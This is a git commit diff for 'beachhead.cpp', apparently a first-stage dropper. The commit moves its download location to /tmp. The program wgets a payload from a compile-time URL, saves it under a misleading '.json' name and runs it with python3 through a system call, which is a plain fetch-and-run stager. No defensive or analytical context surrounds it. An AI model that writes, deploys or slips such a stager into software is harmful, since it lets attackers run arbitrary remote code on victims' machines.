77620fbafd329ed0106487c244f981097204be76
lli555 <lli1921452422@gmail.com>
2026-03-31 14:00:31 -0400

    changed beachhead output directory

--- beachhead/beachhead.cpp
+++ beachhead/beachhead.cpp
@@ -4,13 +4,13 @@
 int main() {
     // Wget URL
     std::string url = URL;
-    std::string command0 = "wget -q " + url + " -O user.json";
+    std::string command0 = "wget -q " + url + " -O /tmp/user.json";
     int r0 = std::system(command0.c_str());
 
     // int r1 = std::system("chmod +x ./user.json");
 
     // Run
-    std::string command1 = "python3 user.json";
+    std::string command1 = "python3 /tmp/user.json";
     int r2 = std::system(command1.c_str());
 
     return 0;
